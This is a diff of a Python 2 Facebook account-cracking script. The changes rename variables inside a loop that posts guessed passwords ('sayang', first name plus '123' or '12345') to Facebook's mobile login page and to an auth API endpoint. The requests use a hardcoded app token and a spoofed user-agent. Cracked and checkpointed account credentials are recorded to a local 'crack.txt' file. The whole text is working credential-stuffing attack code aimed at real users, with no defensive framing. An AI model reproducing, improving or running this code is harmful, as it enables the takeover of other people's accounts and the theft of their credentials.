@@ -319,52 +319,52 @@ def pilih_passxd():
 					cekpoint.append(user+pass1)
 				else:
 					pass1 = 'sayang'
-					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass2, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
+					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass1, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
 					xo = rex.content
 					if 'mbasic_logout_button' in xo or 'save-device' in xo:
-						print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;34m ' + pass2
+						print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;34m ' + pass1
 						oke = open('upil/crack.txt', 'a')
-						oke.write('\nOK '+user+' | '+pass2)
+						oke.write('\nOK '+user+' | '+pass1)
 						oke.close()
-						oks.append(user+pass2)
+						oks.append(user+pass1)
 					else :
 						if 'checkpoint' in xo:
-							print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;31m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
+							print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;31m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
 							cek = open('upil/crack.txt', 'a')
-							cek.write('\n[CP] '+user+' | '+pass2)
+							cek.write('\n[CP] '+user+' | '+pass1)
 							cek.close()
-							cekpoint.append(user+pass2)
+							cekpoint.append(user+pass1)
 						else:
-							pass3 = b['first_name'].lower()+'123'
-							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+							pass2 = b['first_name'].lower()+'123'
+							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;34m ' + pass3
-								oks.append(user+pass3)
+								print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;34m ' + pass2
+								oks.append(user+pass2)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;31m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
+									print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;31m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
 									cek = open("upil/crack.txt", "a")
-									cek.write(user+"|"+pass3+"\n")
+									cek.write(user+"|"+pass2+"\n")
 									cek.close()
-									cekpoint.append(user+pass3)
+									cekpoint.append(user+pass2)
 								else:
-									pass4 = b['first_name'].lower()+'12345'
-									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
+									pass3 = b['first_name'].lower()+'12345'
+									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
 									xo = rex.content
 									if 'mbasic_logout_button' in xo or 'save-device' in xo:
-										print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;34m ' + pass4
+										print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;34m ' + pass3
 										oke = open('upil/crack.txt', 'a')
-										oke.write('\n[OK] '+user+' | '+pass4)
+										oke.write('\n[OK] '+user+' | '+pass3)
 										oke.close()
-										oks.append(user+pass4)
+										oks.append(user+pass3)
 									else:
 										if 'checkpoint' in xo:
-											print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;31m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
+											print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;31m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
 											cek = open('upil/crack.txt', 'a')
-											cek.write('\n[CP] '+user+' | '+pass4)
+											cek.write('\n[CP] '+user+' | '+pass3)
 											cek.close()
-											cekpoint.append(user+pass4)
+											cekpoint.append(user+pass3)
 
         	except:
 			pass
